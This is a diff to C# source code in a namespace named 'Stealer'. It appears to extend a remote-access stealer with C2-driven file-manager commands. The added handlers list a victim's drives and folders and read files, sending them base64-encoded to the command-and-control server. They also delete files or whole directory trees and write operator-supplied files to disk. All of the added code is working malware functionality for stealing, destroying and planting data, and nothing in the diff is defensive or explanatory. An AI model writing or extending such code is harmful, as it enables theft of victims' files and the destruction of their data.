@@ -124,6 +124,25 @@ namespace Stealer
                     KillProcess(pid);
                 }
             }
+            else if (cmdLower.StartsWith("fm_list:"))
+            {
+                FmListDirectory(cmd.Substring("fm_list:".Length));
+            }
+            else if (cmdLower.StartsWith("fm_download:"))
+            {
+                FmDownloadFile(cmd.Substring("fm_download:".Length));
+            }
+            else if (cmdLower.StartsWith("fm_delete:"))
+            {
+                FmDelete(cmd.Substring("fm_delete:".Length));
+            }
+            else if (cmdLower.StartsWith("fm_upload:"))
+            {
+                string rest = cmd.Substring("fm_upload:".Length);
+                int sep = rest.IndexOf('|');
+                if (sep > 0)
+                    FmUploadFile(rest.Substring(0, sep), rest.Substring(sep + 1));
+            }
         }
 
         private static void RunShellCommand(string filename, string args, string responseType)
@@ -202,6 +221,136 @@ namespace Stealer
                 {
                     string errEsc = ex.Message.Replace("\\", "\\\\").Replace("\"", "\\\"");
                     C2Client.SendText("{\"type\":\"kill_res\",\"success\":false,\"pid\":" + pid + ",\"error\":\"" + errEsc + "\"}");
+                }
+            });
+        }
+
+        private static void FmListDirectory(string path)
+        {
+            Task.Run(() =>
+            {
+                try
+                {
+                    string pathEsc = path.Replace("\\", "\\\\").Replace("\"", "\\\"");
+                    var items = new System.Collections.Generic.List<string>();
+
+                    if (string.IsNullOrEmpty(path))
+                    {
+                        foreach (var drive in System.IO.DriveInfo.GetDrives())
+                        {
+                            try
+                            {
+                                string n = drive.Name.Replace("\\", "\\\\");
+                                string label = "";
+                                try { label = (drive.VolumeLabel ?? "").Replace("\"", "\\\""); } catch { }
+                                items.Add("{\"name\":\"" + n + "\",\"type\":\"drive\",\"size\":0,\"modified\":\"\",\"label\":\"" + label + "\"}");
+                            }
+                            catch { }
+                        }
+                    }
+                    else
+                    {
+                        var dir = new System.IO.DirectoryInfo(path);
+                        foreach (var d in dir.GetDirectories())
+                        {
+                            try
+                            {
+                                string n = d.Name.Replace("\\", "\\\\").Replace("\"", "\\\"");
+                                string mod = d.LastWriteTime.ToString("yyyy-MM-dd HH:mm");
+                                items.Add("{\"name\":\"" + n + "\",\"type\":\"dir\",\"size\":0,\"modified\":\"" + mod + "\"}");
+                            }
+                            catch { }
+                        }
+                        foreach (var f in dir.GetFiles())
+                        {
+                            try
+                            {
+                                string n = f.Name.Replace("\\", "\\\\").Replace("\"", "\\\"");
+                                string mod = f.LastWriteTime.ToString("yyyy-MM-dd HH:mm");
+                                items.Add("{\"name\":\"" + n + "\",\"type\":\"file\",\"size\":" + f.Length + ",\"modified\":\"" + mod + "\"}");
+                            }
+                            catch { }
+                        }
+                    }
+
+                    C2Client.SendText("{\"type\":\"fm_list_res\",\"path\":\"" + pathEsc + "\",\"items\":[" + string.Join(",", items.ToArray()) + "]}");
+                }
+                catch (Exception ex)
+                {
+                    string errEsc = ex.Message.Replace("\\", "\\\\").Replace("\"", "\\\"");
+                    string pathEsc = path.Replace("\\", "\\\\").Replace("\"", "\\\"");
+                    C2Client.SendText("{\"type\":\"fm_list_res\",\"path\":\"" + pathEsc + "\",\"error\":\"" + errEsc + "\",\"items\":[]}");
+                }
+            });
+        }
+
+        private static void FmDownloadFile(string path)
+        {
+            Task.Run(() =>
+            {
+                try
+                {
+                    var fi = new System.IO.FileInfo(path);
+                    if (fi.Length > 52428800)
+                    {
+                        string pathEsc2 = path.Replace("\\", "\\\\").Replace("\"", "\\\"");
+                        C2Client.SendText("{\"type\":\"fm_download_res\",\"path\":\"" + pathEsc2 + "\",\"error\":\"File too large (>50MB)\"}");
+                        return;
+                    }
+                    byte[] data = System.IO.File.ReadAllBytes(path);
+                    string b64 = Convert.ToBase64String(data);
+                    string name = System.IO.Path.GetFileName(path).Replace("\\", "\\\\").Replace("\"", "\\\"");
+                    string pathEsc = path.Replace("\\", "\\\\").Replace("\"", "\\\"");
+                    C2Client.SendText("{\"type\":\"fm_download_res\",\"path\":\"" + pathEsc + "\",\"name\":\"" + name + "\",\"data\":\"" + b64 + "\"}");
+                }
+                catch (Exception ex)
+                {
+                    string errEsc = ex.Message.Replace("\\", "\\\\").Replace("\"", "\\\"");
+                    string pathEsc = path.Replace("\\", "\\\\").Replace("\"", "\\\"");
+                    C2Client.SendText("{\"type\":\"fm_download_res\",\"path\":\"" + pathEsc + "\",\"error\":\"" + errEsc + "\"}");
+                }
+            });
+        }
+
+        private static void FmDelete(string path)
+        {
+            Task.Run(() =>
+            {
+                string pathEsc = path.Replace("\\", "\\\\").Replace("\"", "\\\"");
+                try
+                {
+                    if (System.IO.Directory.Exists(path))
+                        System.IO.Directory.Delete(path, true);
+                    else
+                        System.IO.File.Delete(path);
+                    C2Client.SendText("{\"type\":\"fm_delete_res\",\"path\":\"" + pathEsc + "\",\"success\":true}");
+                }
+                catch (Exception ex)
+                {
+                    string errEsc = ex.Message.Replace("\\", "\\\\").Replace("\"", "\\\"");
+                    C2Client.SendText("{\"type\":\"fm_delete_res\",\"path\":\"" + pathEsc + "\",\"success\":false,\"error\":\"" + errEsc + "\"}");
+                }
+            });
+        }
+
+        private static void FmUploadFile(string path, string b64data)
+        {
+            Task.Run(() =>
+            {
+                string pathEsc = path.Replace("\\", "\\\\").Replace("\"", "\\\"");
+                try
+                {
+                    byte[] data = Convert.FromBase64String(b64data);
+                    string dir = System.IO.Path.GetDirectoryName(path);
+                    if (!string.IsNullOrEmpty(dir) && !System.IO.Directory.Exists(dir))
+                        System.IO.Directory.CreateDirectory(dir);
+                    System.IO.File.WriteAllBytes(path, data);
+                    C2Client.SendText("{\"type\":\"fm_upload_res\",\"path\":\"" + pathEsc + "\",\"success\":true}");
+                }
+                catch (Exception ex)
+                {
+                    string errEsc = ex.Message.Replace("\\", "\\\\").Replace("\"", "\\\"");
+                    C2Client.SendText("{\"type\":\"fm_upload_res\",\"path\":\"" + pathEsc + "\",\"success\":false,\"error\":\"" + errEsc + "\"}");
                 }
             });
         }
